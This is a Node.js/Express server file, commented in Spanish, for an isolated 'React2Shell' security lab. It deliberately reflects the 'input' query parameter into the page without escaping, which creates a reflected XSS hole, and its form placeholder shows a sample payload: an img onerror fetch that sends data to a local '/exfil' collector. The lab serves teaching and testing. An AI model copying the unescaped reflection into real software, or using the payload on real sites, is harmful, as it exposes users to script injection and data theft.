// vulnerable-app/server.js
// React2Shell lab - modo VULNERABLE (XSS intencional)
// Úsalo SOLO en laboratorio aislado. No ejecutar en producción.
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '1mb' }));

const DATA_DIR = '/data';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

// Ruta vulnerable: refleja directamente el parámetro `input` SIN escapar.
// Esto produce XSS ejecutable en el navegador (intencional para el lab).
app.get('/', (req, res) => {
  const input = req.query.input || '';
  const html = `<!doctype html>
  <html lang="es">
  <head>
    <meta charset="utf-8">
    <title>React2Shell lab - VULNERABLE</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
      body { font-family: Arial, sans-serif; margin: 24px; }
      .note { color: #b00; font-weight: bold; }
      form { margin-top: 16px; }
      input[type="text"] { width: 70%; }
    </style>
  </head>
  <body>
    <!-- A propósito incluimos el input SIN escape: VULNERABLE -->
    ${input}

    <h2>React2Shell lab: Modo vulnerable</h2>
    <p class="note">Este servidor refleja <code>?input=</code> directamente en la página (XSS intencional).</p>

    <form method="get" action="/">
      <label for="input">Prueba (input):</label>
      <input id="input" name="input" type="text" placeholder='&lt;img src=x onerror=fetch("http://127.0.0.1:9000/exfil?data=pwned")&gt;' />
      <button type="submit">Enviar</button>
    </form>

    <p>Health: <a href="/health">/health</a> — Logs: <a href="/logs">/logs</a></p>
  </body>
  </html>`;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// Endpoint que simula un endpoint RSC/Server Function
// Guarda el payload en /data para análisis forense; NO ejecuta nada del payload.
app.post('/rsc', (req, res) => {
  const payload = {
    time: new Date().toISOString(),
    headers: req.headers,
    body: req.body
  };
  const filename = path.join(DATA_DIR, `payload_${Date.now()}.json`);
  try {
    fs.writeFileSync(filename, JSON.stringify(payload, null, 2));
    console.log('[RSC SIM] Registrado payload en', filename);
    res.json({ status: 'accepted', id: path.basename(filename) });
  } catch (e) {
    console.error('[RSC SIM] Error al guardar payload:', e.message);
    res.status(500).json({ status: 'error', error: e.message });
  }
});

// Health / admin endpoints
app.get('/health', (req, res) => res.json({ status: 'ok' }));

// Lista últimos archivos guardados en /data
app.get('/logs', (req, res) => {
  try {
    const files = fs.readdirSync(DATA_DIR)
      .filter(f => f.startsWith('payload_'))
      .sort()
      .slice(-50);
    res.json(files);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Recomendación: escucha en 0.0.0.0 para que Docker exponga puerto al host
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Vulnerable-app (VULNERABLE) listening on ${PORT}`);
});
